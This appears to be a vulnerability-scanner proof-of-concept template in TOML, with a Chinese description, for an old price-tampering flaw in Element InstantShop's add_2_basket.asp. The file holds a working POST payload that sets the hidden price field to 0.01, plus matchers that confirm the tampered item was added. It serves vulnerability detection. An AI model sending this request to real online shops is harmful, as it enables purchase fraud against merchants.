[info]
author = "ave"
description = "向 Element InstantShop 的 add_2_basket.asp 发送 POST 请求，修改 price 隐藏字段值为 0.01，验证是否以篡改价格将商品加入购物车"
id = "POC-AVE-2000-1042"
name = "Element InstantShop 价格参数篡改 PoC"
severity = "high"
tags = ["ave-2000-1042"]
vuln_id = [
    "CVE-2000-1001",
    "AVE-2000-1042",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/add_2_basket.asp"
protocol = "http"

[poc.requests.body]
content = "product_id=1&price=0.01&quantity=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "basket",
    "added",
    "success",
]
